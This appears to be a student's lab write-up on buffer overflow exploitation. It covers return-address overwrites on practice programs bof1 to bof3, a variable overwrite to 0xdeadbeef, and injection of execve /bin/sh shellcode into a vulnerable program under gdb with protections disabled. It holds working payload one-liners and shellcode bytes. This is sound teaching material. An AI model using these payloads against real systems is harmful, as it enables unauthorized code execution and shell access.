# Lab 1: Buffer Over Flow#
# Task 1 Stack smashing by memory overwritten
## 1.1. bof1.c
To make a buffer overflow attack in bof1.c program, we see the program has array with size of 200 inside vuln function, we can visualize as model below:

Build the program using gcc -g bof1.c -o bof1.o and -fno-stack-protection to disable stack protection and set boundary = 2:

![1 1](https://github.com/domanh10/Lab1/assets/161590352/3758cced-2682-4e4f-9a95-3b767f18f0de)

Go to gdp of 'bof1.out' with the command `gdb bof1.out -q`, and find the address of the **'selectFunc'** function with the command `disas secretFunc`. So we can get the address of function **'selectFunc'** as follows '0x0804846b'

![1 2](https://github.com/domanh10/Lab1/assets/161590352/39ec14b4-e1c9-4693-9c63-6bfff53c6536)

Run the program with the 204 letter 'a' plus the address of the **'selectFunc'** function with the following command `(python -c "print('a'*204+'\x6b\x84\x04\x08')") | ./bof1.out`

->>***The terminal showing the 'Congratulation!' line from the 'secretFunc' function which means this method worked***

## 1.2. bof2.c
In this program, we need to make buffer overflow to spill the data into ‘check’ variable to make it equals to `0xdeadbeef` to satisfy the condition.
First, we visualize the Stack frame:

![1 5](https://github.com/domanh10/Lab1/assets/161590352/5ce76396-c618-4283-85fb-9e5e6f814897)

Build the program using gcc -g bof2.c -o bof2.out and -fno-stack-protection to disable stack protection and set boundary = 2: `gcc -g bof2.c -o bof2.out -fno-stack-protector -mpreferred-stack-boundary=2`. Go to gdp of 'bof2.out' with the command `gdb bof2.out -q`, and find the address of the **'main'** function with the command `disas main`. So we can get the address of function **'main'** 

![2 1](https://github.com/domanh10/Lab1/assets/161590352/cdc01c65-91e6-4209-be63-98920bcae3ce)

If you run the program with the 40 letter 'a' plus an address other than the following address `0xdeadbeef` with the following command `(python -c "print('a'*40+'\xef\xbe\xad\xdf')") | ./bof2.out`

![2 4](https://github.com/domanh10/Lab1/assets/161590352/3eb30dff-ce06-4e83-afb2-c4109b5163c5)

->>***The terminal showing the 'You are on the right way!' line from the 'main' function which means that you need to use `0xdeadbeef`***

Run the program with the 40 letter 'a' plus the address of the `0xdeadbeef` with the following command `(python -c "print('a'*40+'\xef\xbe\xad\xde')") | ./bof2.out`

![2 2](https://github.com/domanh10/Lab1/assets/161590352/a965f551-677f-4d4c-b701-171e402878b2)

->>***The terminal showing the 'Yeah! You win!' line from the 'main' function which means this method worked***

## 1.3. bof3.c
This is the stack frame of program, because main function doesn’t have input argument. Our target is execute the shell function.

![3 1](https://github.com/domanh10/Lab1/assets/161590352/8fce09b3-776f-4e3a-8420-0037d96715b4)

Build the program using gcc -g bof3.c -o bof3.out and -fno-stack-protection to disable stack protection and set boundary = 2: `gcc -g bof3.c -o bof3.out -fno-stack-protector -mpreferred-stack-boundary=2`. Go to gdp of 'bof3.out' with the command `gdb bof2.out -q`, and find the address of the **'shell'** function with the command `disas shell`. So we can get the address of function **'shell'**. Find the address of the **'sup'** function with the command `disas sup`. So we can get the address of function **'sup'**.

![3 1](https://github.com/domanh10/Lab1/assets/161590352/69ae7ccc-3dff-47e3-bf48-657585ed29f0)

Run the program with the 128 letter 'a' plus the address of the **'shell'** function with the following command `(python -c "print('a'*128+'\x6e\x84\x04\x08')") | ./bof3.out`

Run the program with the 128 letter 'a' plus the address of the **'sup'** function with the following command `(python -c "print('a'*128+'\x6b\x84\x04\x08')") | ./bof3.out`

->>***The terminal showing the 'Congrat!' line from the 'shell' function which means this method worked***

->>***The terminal showing the 'You made it! The shell() function is executed' line from the 'sup' function which means this method worked***

# Task 2 Code injection 
## 2.1. Preparing shell code
Write shellcode program in assembly language (sh.asm), compile with nasm (sh.o) then link with ld to generate executable file (sh)

![4 1](https://github.com/domanh10/Lab1/assets/161590352/89f6e632-52a9-428d-866d-17df552e64ee)

Run the following script to get the hex string of shellcode: `$> for i in $(objdump -d shell |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo` 

![4 2](https://github.com/domanh10/Lab1/assets/161590352/bfc39cff-3c8f-4e4d-8a3f-a2dcbe4a7824)

--> hex string generated: `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80`

## 2.2. Preparing payload
Compile program with options to defeat stack protecting mechanism and code execution on stack: `$> gcc vuln.c -o vuln.out -fno-stack-protector -z execstack -mpreferred-stack-boundary=2`

Creat link to zsh instead of default dash to turn off bash countermeasures of Ubuntu 16.04: `sudo ln -sf /bin/zsh /bin/sh`

![4 3](https://github.com/domanh10/Lab1/assets/161590352/f5ca29cb-2c7c-4a2c-b771-33dc38ba7061)

## 2.3. Code injection 
Load vuln.out in gdb: `$> gdb vuln.out`

![4 7](https://github.com/domanh10/Lab1/assets/161590352/8c4a1514-33a4-4443-9d9f-ec2bd99d5b3d)

Set break point after strcpy instruction

Run program in gdb with injecting argument: `(gdb-peda)r $(python -c "print(<injecting shellcode along with padding bytes>+'\xff\xff\xff\xff')")`

Watch the stack memory from esp (stack top): `(gdb-peda) x/80xb $esp`

![4 4](https://github.com/domanh10/Lab1/assets/161590352/1e427664-f3dd-4225-8eae-789b3188db64)

![4 5](https://github.com/domanh10/Lab1/assets/161590352/57f15e2f-818e-4342-9462-955f58d62009)

![4 8](https://github.com/domanh10/Lab1/assets/161590352/019ac752-c583-447e-bb4f-e14adcfe0dba)

Identify the return address while watching out the stack, then replace `\xff\xff\xff\xff` with the value of esp: `set *<address of return address> = <address of esp>`

Continue executing program, you should now in the new bash shell: `(gdb-peda) continue`

![4 9](https://github.com/domanh10/Lab1/assets/161590352/d3c45658-5259-4f63-9508-6513ae9c0412)

->>`$_` <-- you are in the new bash.
